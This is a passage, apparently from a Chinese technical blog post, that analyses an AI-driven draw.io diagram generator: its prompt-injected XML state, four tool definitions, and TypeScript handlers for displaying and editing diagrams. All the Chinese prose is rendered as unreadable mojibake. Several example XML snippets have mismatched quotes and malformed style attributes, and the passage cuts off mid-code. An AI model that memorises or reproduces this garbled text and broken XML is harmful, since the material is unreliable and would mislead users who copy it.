<span class="hljs-bullet">-</span> é—´è·ï¼šæ‰€æœ‰å…ƒç´ ä¹‹é—´è‡³å°‘ä¿æŒ 50px çš„é—´è·

<span class="hljs-bullet">-</span> æ— é‡å ï¼šå…ƒç´ å’Œè¾¹ç¼˜ç»ä¸èƒ½é‡å 

<span class="hljs-bullet">-</span> ç®­å¤´å®šä½å¿…é¡»éµå¾ªå…¨éƒ¨ 7 æ¡è¾¹ç¼˜è·¯ç”±è§„åˆ™

<span class="hljs-bullet">-</span> ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡éšœç¢ç‰©

<span class="hljs-bullet">-</span> å¯¹äºåŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„å¤šæ¡è¾¹ç¼˜ï¼Œä½¿ç”¨ä¸åŒçš„ exitY/entryY å€¼

</code></pre>
<h6 data-id="heading-8"><code>XML</code>çŠ¶æ€</h6>
<pre><code class="hljs language-typescript" lang="typescript">${previousXml
	? <span class="hljs-string">`ä¸Šä¸€ä¸ªå›¾è¡¨ XMLï¼ˆç”¨æˆ·æœ€åä¸€æ¡æ¶ˆæ¯ä¹‹å‰ï¼‰ï¼š\n"""xml\n<span class="hljs-subst">${previousXml}</span>\n"""\n\n`</span>
	: <span class="hljs-string">""</span>
}å½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span>ï¼ˆæƒå¨ - å”¯ä¸€æ•°æ®æºï¼‰ï¼š\n<span class="hljs-string">""</span><span class="hljs-string">"xml\n${xml || "</span><span class="hljs-string">"}\n"</span><span class="hljs-string">""</span>\n\né‡è¦æç¤ºï¼šå½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span> æ˜¯ç”»å¸ƒä¸Šå½“å‰å†…å®¹çš„å”¯ä¸€æ•°æ®æºã€‚ç”¨æˆ·å¯ä»¥åœ¨ draw.<span class="hljs-property">io</span> ä¸­æ‰‹åŠ¨æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹å½¢çŠ¶ã€‚å§‹ç»ˆåŸºäºå½“å‰ <span class="hljs-variable constant_">XML</span> æ¥è®¡æ•°å’Œæè¿°å…ƒç´ ï¼Œè€Œä¸æ˜¯åŸºäºä¹‹å‰ç”Ÿæˆçš„ <span class="hljs-variable constant_">XML</span>ã€‚å¦‚æœåŒæ—¶æ˜¾ç¤ºäº†ä¸Šä¸€ä¸ªå’Œå½“å‰çš„ <span class="hljs-variable constant_">XML</span>ï¼Œè¯·æ¯”è¾ƒå®ƒä»¬ä»¥äº†è§£ç”¨æˆ·æ›´æ”¹äº†å“ªäº›å†…å®¹ã€‚ä½¿ç”¨ edit_diagram æ—¶ï¼Œè¯·åŠ¡å¿…ä»å½“å‰ <span class="hljs-variable constant_">XML</span> ä¸­å®Œå…¨å¤åˆ¶æœç´¢æ¨¡å¼ - å±æ€§é¡ºåºå¾ˆé‡è¦ï¼
</code></pre>
<h5 data-id="heading-9">b.<code>tool</code>å®šä¹‰ä¸æ³¨å…¥</h5>
<blockquote>
<p>ä»£ç ä½äº<code>app\api\chat\route.ts[595-760]</code></p>
</blockquote>
<p>å’Œä¸Šè¿°ç³»ç»Ÿæç¤ºè¯ä¸­æ³¨å…¥çš„ä¸€èˆ¬ï¼Œå®¢æˆ·ç«¯ä¾§æ³¨å…¥çš„èƒ½åŠ›å…±æœ‰å››ä¸ªï¼š
<code>display_diagram</code>ã€<code>edit_diagram</code>ã€<code>append_diagram</code>å’Œ<code>get_shape_library</code></p>
<h6 data-id="heading-10"><code>display_diagram</code></h6>
<pre><code class="hljs language-ini" lang="ini">åœ¨draw.ioä¸Šæ˜¾ç¤ºå›¾è¡¨ã€‚åªä¼ é€’mxCellå…ƒç´ â€”â€”åŒ…è£…å™¨æ ‡ç­¾å’Œæ ¹å•å…ƒæ˜¯è‡ªåŠ¨æ·»åŠ çš„ã€‚



éªŒè¯è§„åˆ™ï¼ˆå¦‚æœè¿åï¼ŒXMLå°†è¢«æ‹’ç»ï¼‰ï¼š

1. åªç”ŸæˆmxCellå…ƒç´ -æ²¡æœ‰åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;, &lt;mxGraphModel&gt;, &lt;root&gt;ï¼‰

2. ä¸åŒ…æ‹¬æ ¹Cellsï¼ˆ<span class="hljs-attr">id</span>=<span class="hljs-string">"0â€œæˆ–id=â€1"</span>ï¼‰ -ä»–ä»¬æ˜¯è‡ªåŠ¨æ·»åŠ 

3. æ‰€æœ‰çš„mxCellå…ƒç´ å¿…é¡»æ˜¯å…„å¼Ÿå…ƒç´ â€”â€”ä¸èƒ½åµŒå¥—

4. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„idï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

5. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„çˆ¶å±æ€§ï¼ˆä½¿ç”¨â€œ1â€ä½œä¸ºé¡¶å±‚ï¼‰

6. è½¬ä¹‰å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š&amp;ltï¼› &amp;gt<span class="hljs-comment">; &amp; &amp;quotï¼›</span>



ç¤ºä¾‹ï¼ˆåªç”Ÿæˆè¿™ä¸ª-ä¸ç”ŸæˆåŒ…è£…å™¨æ ‡ç­¾ï¼‰ï¼š

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane1"</span> value=â€œFrontendâ€œ style=â€æ³³é“â€ vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">" step1"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"Backend"</span> style=<span class="hljs-string">"swimlane "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">" step2"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle= "</span> orthogonalEdgeStyle <span class="hljs-string">" endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> source=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">relative</span>=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;



æ³¨:

â€”å¯¹äºAWSå›¾è¡¨ï¼Œè¯·ä½¿ç”¨**AWS 2025å›¾æ ‡**ã€‚

-å¯¹äºåŠ¨ç”»è¿æ¥å™¨ï¼Œæ·»åŠ â€œ<span class="hljs-attr">flowAnimation</span>=<span class="hljs-number">1</span>â€è¾¹ç¼˜æ ·å¼ã€‚
</code></pre>
<h6 data-id="heading-11"><code>edit_diagram</code></h6>
<pre><code class="hljs language-bash" lang="bash">
é€šè¿‡åŸºäº<span class="hljs-built_in">id</span>çš„æ“ä½œï¼ˆæ›´æ–°/æ·»åŠ /åˆ é™¤å•å…ƒæ ¼ï¼‰ç¼–è¾‘å½“å‰å…³ç³»å›¾ã€‚

æ“ä½œ:
â€”updateï¼šé€šè¿‡å®ƒçš„<span class="hljs-built_in">id</span>å°†ç°æœ‰å•å…ƒæ ¼æ›¿æ¢ã€‚æä¾›cell_idå’Œå®Œæ•´çš„new_xmlã€‚
â€”addï¼šæ·»åŠ æ–°çš„å•å…ƒæ ¼ã€‚æä¾›cell_idï¼ˆæ–°çš„å”¯ä¸€<span class="hljs-built_in">id</span>ï¼‰å’Œnew_xmlã€‚
â€”deleteï¼šåˆ é™¤å•å…ƒæ ¼ã€‚çº§è”æ˜¯è‡ªåŠ¨çš„ï¼šå­çº§å’Œè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰è¢«è‡ªåŠ¨åˆ é™¤ã€‚åªèƒ½æŒ‡å®šä¸€ä¸ªcell_idã€‚

å¯¹äºæ›´æ–°/æ·»åŠ ï¼Œnew_xmlå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„mxCellå…ƒç´ ï¼ŒåŒ…æ‹¬mxGeometryã€‚

âš ï¸JSON ESCAPING: new_xmlä¸­çš„æ¯ä¸€ä¸ªâ€œå¿…é¡»è¢«è½¬ä¹‰ä¸º\\â€ã€‚ç¤ºä¾‹ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\â€œLabel\\â€

â€”æ·»åŠ ä¸€ä¸ªçŸ©å½¢ï¼š
{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"rect-1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>rect-1\\" value=\\"Hello\\" style=\\"rounded=0; \\" vertex=\\"1\\" parent=\\"1\\"&gt;&lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;&lt;/mxCell&gt;<span class="hljs-string">"}]}

ç¤ºä¾‹-åˆ é™¤å®¹å™¨ï¼ˆå­èŠ‚ç‚¹å’Œè¾¹ç¼˜è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š
{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>delete<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>2<span class="hljs-string">"}]}

</span></code></pre>
<h6 data-id="heading-12"><code>append_diagram</code></h6>
<pre><code class="hljs language-markdown" lang="markdown">å½“å…ˆå‰çš„display<span class="hljs-emphasis">_diagramè¾“å‡ºç”±äºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨XMLã€‚

ä½•æ—¶ä½¿ç”¨ï¼šä»…åœ¨display_</span>diagramè¢«æˆªæ–­åè°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨å°†çœ‹åˆ°å…³äºæˆªæ–­çš„é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚

å…³é”®çš„æŒ‡ä»¤:
<span class="hljs-bullet">1.</span> ä¸åŒ…æ‹¬ä»»ä½•åŒ…è£…æ ‡ç­¾-åªæ˜¯ç»§ç»­mxCellå…ƒç´ 
<span class="hljs-bullet">2.</span> ä»ä¹‹å‰è¾“å‡ºåœæ­¢çš„åœ°æ–¹ç»§ç»­
<span class="hljs-bullet">3.</span> å®Œæˆå‰©ä½™çš„mxCellå…ƒç´ 
<span class="hljs-bullet">4.</span> å¦‚æœä»ç„¶è¢«æˆªæ–­ï¼Œä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨append<span class="hljs-emphasis">_diagram

ä¾‹å¦‚ï¼šå¦‚æœå‰é¢çš„è¾“å‡ºä»¥â€˜<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mxCell</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"rounded=1 â€œç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥â€™ï¼›â€ vertex="</span><span class="hljs-attr">1</span>"&gt;</span></span>â€¦â€™å¹¶å®Œæˆå‰©ä¸‹çš„å…ƒç´ ã€‚

</span></code></pre>
<h6 data-id="heading-13"><code>get_shape_library</code></h6>
<p>è¿™äº›å½¢çŠ¶/å›¾æ ‡æ–‡æ¡£å†…å®¹æ”¾ç½®äº<code>docs\shape-libraries</code>ï¼Œå®ƒçš„å®é™…ä½œç”¨æ˜¯åœ¨è°ƒç”¨å…¶ä»–ç”»å¸ƒå·¥å…·å‰æ‰§è¡Œçš„é¢å¤–çŸ¥è¯†è·å–ã€‚</p>
<pre><code class="hljs language-diff" lang="diff">è·å–`draw.io`å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ï¼ŒåŒ…å«æ ·å¼è¯­æ³•å’Œå½¢çŠ¶åç§°ã€‚

å¯ç”¨åº“:
<span class="hljs-deletion">- Cloud: aws4, azure2, gcp2, alibaba_cloud, openstack, salesforce</span>
<span class="hljs-deletion">- Networking: cisco19, network, kubernetes, vvd, rack</span>
<span class="hljs-deletion">- Business: bpmn, lean_mapping</span>
<span class="hljs-deletion">- General: flowchart, basic, arrows2, infographic, sitemap</span>
<span class="hljs-deletion">- UI/Mockups: android</span>
<span class="hljs-deletion">- Enterprise: citrix, sap, mscae, atlassian</span>
<span class="hljs-deletion">- Engineering: fluidpower, electrical, pid, cabinets, floorplan</span>
<span class="hljs-deletion">- Icons: webicons</span>

è°ƒç”¨æ­¤å·¥å…·å¯è·å–ç‰¹å®šåº“çš„å½¢çŠ¶åç§°å’Œç”¨æ³•è¯­æ³•ã€‚
</code></pre>
<blockquote>
<p>ä¸å…¶ä»–å·¥å…·æœ‰å·®å¼‚çš„æ˜¯è¿™ä¸€å·¥å…·å±äºæœåŠ¡ç«¯å·¥å…·ï¼Œèƒ½å¤Ÿç›´æ¥è¿”å›ï¼Œè€Œå…¶ä½™ä¸‰ä¸ªæ§åˆ¶ç”»å¸ƒçš„å·¥å…·éœ€è¦ä¸å‰ç«¯äº¤äº’ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ï¼Œä½¿ç”¨äº†<code>ai.js</code>å’Œ<code>@ai-sdk/react</code>è¿™ä¸¤ä¸ªåº“ç®€åŒ–äº†å¤æ‚çš„å¤§æ¨¡å‹ä¸å‰ç«¯å·¥å…·çš„è°ƒç”¨äº¤äº’ï¼Œå…·ä½“å‚è€ƒï¼š[[é€šè¿‡<code>ai.js</code>ä¸<code>@ai-sdk</code>å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]</p>
</blockquote>
<h5 data-id="heading-14">c.æ€»ç»“</h5>
<p>æç¤ºè¯éƒ¨åˆ†å®šä¹‰äº†å„ç±»å·¥å…·ï¼ˆæœåŠ¡ç«¯/å®¢æˆ·ç«¯ï¼‰åŠå…¶ç¼–æ’ã€æä¾›äº†ä¸€äº›æ ·ä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ã€åˆ¶å®šäº†ä¸€äº›ç»˜åˆ¶è§„èŒƒã€æè¿°äº†æ ·å¼è§„åˆ™ï¼›æ­¤å¤–åœ¨æ›´æ–°æ—¶ï¼Œé™¤äº†å½“å‰ç”»å¸ƒçš„æ’å¸ƒæ•°æ®è¿˜é¢å¤–æ³¨å…¥äº†ä¸Šä¸€æ¬¡æ¨¡å‹ç”Ÿæˆçš„å›¾æ•°æ®ï¼Œä½¿å¾—æ¨¡å‹æ›´å¥½çš„ç†è§£ç”¨æˆ·è¡Œä¸ºè¿›è¡Œåç»­æ’å¸ƒã€‚</p>
<h4 data-id="heading-15">3.å®¢æˆ·ç«¯æ‰§è¡Œå¤„ç†</h4>
<blockquote>
<p>ä»£ç ä½äº<code>hooks\use-diagram-tool-handlers.ts</code></p>
</blockquote>
<h5 data-id="heading-16">a.<code>display_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span> 
<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–toolCall.inputä¸­çš„xmlå­—ç¬¦ä¸²"</span>]</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"æ£€æµ‹XMLæ˜¯å¦æˆªæ–­ï¼ˆisMxCellXmlCompleteï¼‰"</span>]</span>
C --&gt;|æˆªæ–­ï¼ˆisTruncated=trueï¼‰| D<span class="hljs-selector-attr">[<span class="hljs-string">"å­˜å‚¨ä¸å®Œæ•´XMLåˆ°partialXmlRef"</span>]</span>
D --&gt; E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚è°ƒç”¨append_diagramç»­ä¼ "</span>]</span>
E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"returnç»ˆæ­¢å‡½æ•°"</span>]</span>
C --&gt;|å®Œæ•´ï¼ˆisTruncated=falseï¼‰| G<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®partialXmlRefä¸ºç©º"</span>]</span>
G --&gt; H<span class="hljs-selector-attr">[<span class="hljs-string">"ç”¨wrapWithMxFileåŒ…è£…XMLä¸ºdraw.ioæ ‡å‡†æ ¼å¼"</span>]</span>
H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨onDisplayChartéªŒè¯å¹¶åŠ è½½XML"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯å¤±è´¥ï¼ˆæœ‰validationErrorï¼‰| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚ä¿®å¤XMLé‡è¯•"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯æˆåŠŸï¼ˆæ— validationErrorï¼‰| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æˆåŠŸæç¤ºï¼Œå‰ç«¯æ¸²æŸ“å›¾è¡¨"</span>]</span>
</code></pre>
<p>ä»£ç ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDisplayDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  toolCall: ToolCall,
Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }

  <span class="hljs-comment">// æ£€æŸ¥å®Œæ•´æ€§</span>
Â  <span class="hljs-keyword">const</span> isTruncated = !<span class="hljs-title function_">isMxCellXmlComplete</span>(xml)
Â  <span class="hljs-keyword">if</span> (isTruncated) {
Â  Â  Â  <span class="hljs-comment">// ä¸´æ—¶å­˜å‚¨ï¼Œä¾¿äºåç»­å®Œå–„</span>
Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = xml
     <span class="hljs-comment">// è¿”å›å¤§æ¨¡å‹éœ€è¦ç»­å†™</span>
Â  Â  Â  <span class="hljs-keyword">const</span> partialEnding = partialXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">500</span>)
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Output was truncated due to length limits. Use the append_diagram tool to continue.

Your output ended with:
\`\`\`
<span class="hljs-subst">${partialEnding}</span>
\`\`\`

NEXT STEP: Call append_diagram with the continuation XML.
- Do NOT include wrapper tags or root cells (id="0", id="1")
- Start from EXACTLY where you stopped
- Complete all remaining mxCell elements`</span>,
Â  Â  Â  })
Â  Â  Â  <span class="hljs-keyword">return</span>
Â  }

Â  <span class="hljs-keyword">const</span> finalXml = xml
Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>

  <span class="hljs-comment">// åŒ…è£…ä¸º`draw.io`è¯†åˆ«çš„å®Œæ•´æ ¼å¼</span>
Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)

Â  <span class="hljs-comment">// æ¸²æŸ“æ£€éªŒ</span>
Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  <span class="hljs-comment">// è¿”å›éœ€è¦é‡è¯•</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`<span class="hljs-subst">${validationError}</span>
Please fix the XML issues and call display_diagram again with corrected XML.
Your failed XML:
\`\`\`xml
<span class="hljs-subst">${finalXml}</span>
\`\`\``</span>,
Â  Â  Â  })
Â  } <span class="hljs-keyword">else</span> {
	  <span class="hljs-comment">// è¿”å›æˆåŠŸ</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Successfully displayed the diagram."</span>,
Â  Â  Â  })
Â  }
}

</code></pre>
<h5 data-id="heading-17">b.<code>edit_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç¼–è¾‘æ“ä½œåˆ—è¡¨operations"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[<span class="hljs-string">"ä¸‰çº§å…œåº•è·å–åŸå§‹XMLâ†’currentXml"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨applyDiagramOperationsæ‰§è¡Œç¼–è¾‘"</span>]</span>
    C --&gt; D{æ“ä½œæ˜¯å¦å‡ºé”™ï¼Ÿ&lt;br/&gt;errors<span class="hljs-selector-class">.length</span>&gt;<span class="hljs-number">0</span>?}
    D --&gt;|æ˜¯| E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›å…·ä½“çš„æ“ä½œå¤±è´¥å³ä¿®å¤æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    D --&gt;|å¦| F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯ç¼–è¾‘åçš„XMLåˆæ³•æ€§"</span>]</span>
    F --&gt; G{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErroræ˜¯å¦å­˜åœ¨ï¼Ÿ}
    G --&gt;|å¦ï¼ˆéæ³•ï¼‰| H<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›XMLæ— æ•ˆ,éœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    G --&gt;|æ˜¯ï¼ˆåˆæ³•ï¼‰| <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"å¯¼å‡ºç¼–è¾‘åçš„å›¾è¡¨+è¿”å›æˆåŠŸæç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    C --&gt; J<span class="hljs-selector-attr">[æ•è·å…¨å±€å¼‚å¸¸]</span>
    J --&gt; K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é€šç”¨é”™è¯¯ï¼Œéœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    F --&gt; J
    <span class="hljs-selector-tag">I</span> --&gt; J

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEditDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { operations } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> {
Â  Â  Â  Â  <span class="hljs-attr">operations</span>: <span class="hljs-title class_">DiagramOperation</span>[]
Â  Â  }
Â  Â  <span class="hljs-keyword">let</span> currentXml = <span class="hljs-string">""</span>

Â  Â  <span class="hljs-keyword">try</span> {
		<span class="hljs-comment">/** 
		* 1.ä» `editDiagramOriginalXmlRef.current`ï¼ˆæŒ‰ toolCallId ç´¢å¼•ï¼‰è·å–æµå¼å¤„ç†æ—¶æ•è·çš„åŸå§‹ XMLï¼ˆä¿è¯ç¼–è¾‘åŸºäºæœ€æ–°çš„åŸºå‡†ç‰ˆæœ¬ï¼‰ï¼›
        * 2.å¦‚æœæ²¡æœ‰ä¸Šè¿°æ•°æ®ï¼Œä» `chartXMLRef.current`ï¼ˆç¼“å­˜çš„å›¾è¡¨ XMLï¼‰è·å–ï¼›
        * 3.å…œåº•è°ƒç”¨ `onFetchChart(false)` ä» iframe ä¸­å¯¼å‡ºå½“å‰å›¾è¡¨çš„ XMLã€‚
		*/</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> originalXml = editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">get</span>(
Â  Â  Â  Â  Â  Â  toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  )
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (originalXml) {
Â  Â  Â  Â  Â  Â  currentXml = originalXml
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> cachedXML = chartXMLRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (cachedXML) {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = cachedXML
Â  Â  Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = <span class="hljs-keyword">await</span> <span class="hljs-title function_">onFetchChart</span>(<span class="hljs-literal">false</span>)
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
  
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { applyDiagramOperations } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"@/lib/utils"</span>)
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { <span class="hljs-attr">result</span>: editedXml, errors } = <span class="hljs-title function_">applyDiagramOperations</span>(
Â  Â  Â  Â  Â  Â  currentXml,
Â  Â  Â  Â  Â  Â  operations,
Â  Â  Â  Â  )
		<span class="hljs-comment">// å¦‚æœéƒ¨åˆ†æ“ä½œæ‰§è¡Œé”™è¯¯ï¼Œè¿”å›æ¨¡å‹å“ªäº›å‡ºé”™</span>
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (errors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessages = errors
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span><span class="hljs-string">`- <span class="hljs-subst">${e.<span class="hljs-keyword">type</span>}</span> on cell_id="<span class="hljs-subst">${e.cellId}</span>": <span class="hljs-subst">${e.message}</span>`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
